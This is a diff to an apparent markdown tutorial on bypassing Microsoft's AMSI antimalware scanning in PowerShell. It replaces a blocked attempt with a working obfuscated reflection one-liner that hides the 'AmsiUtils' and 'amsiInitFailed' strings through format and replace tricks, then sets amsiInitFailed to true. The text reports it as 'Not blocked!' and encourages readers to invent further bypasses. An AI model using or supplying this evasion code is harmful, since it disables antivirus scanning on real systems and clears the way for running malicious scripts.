@@ -152,14 +152,13 @@ Now lets try to split a string up or two!
 
 Lets start with the `"System.Management.Automation.AmsiUtils"` specifically the `AmsiUtils` part
 
-```
-$code="Write-OutPut `"System.Management.Automation .`" +`"Amis`"+`"Utils`" "
-```
+By using string replacement `str{0}{1}g -f "i","n"` and Replaceing a variable we can bypass the AV
 
 iex
 ```
-[Ref].Assembly.GetType((iex $code)).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+[Ref].Assembly.GetType('System.Management.Automation.BBB'+'msiU{0}s' -f 'til' -Replace("BBB", "A")).GetField(('amsiI{0}tFailed' -f 'ni'),'NonPublic,Static').SetValue($null,$true)
 ```
-> Still blocked!
+> Not blocked! 
 
 
+There are numerous ways to bypass using simple tricks like the above, have a play and get creative! 
